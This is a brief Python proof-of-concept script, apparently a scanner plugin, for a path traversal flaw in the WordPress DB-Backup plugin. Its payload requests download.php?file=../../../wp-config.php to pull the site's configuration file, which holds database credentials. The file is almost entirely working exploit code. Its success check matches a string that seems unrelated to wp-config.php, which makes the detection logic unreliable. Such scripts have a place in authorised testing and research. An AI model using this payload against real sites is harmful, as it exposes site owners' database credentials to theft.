#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  WordPress DB-Backup Plugin  任意文件下载漏洞 POC
Reference  :  http://beebeeto.com/pdb/poc-2014-0209/
"""

import  re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    payload = 'plugins/db-backup/download.php?file=../../../wp-config.php'
    verify_url = url + '/wp-content/' + payload
    code, head, res, errcode, _ = curl.curl(verify_url)
    reg = re.compile("webdb\['mymd5'\]")
    if reg.findall(res):
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])
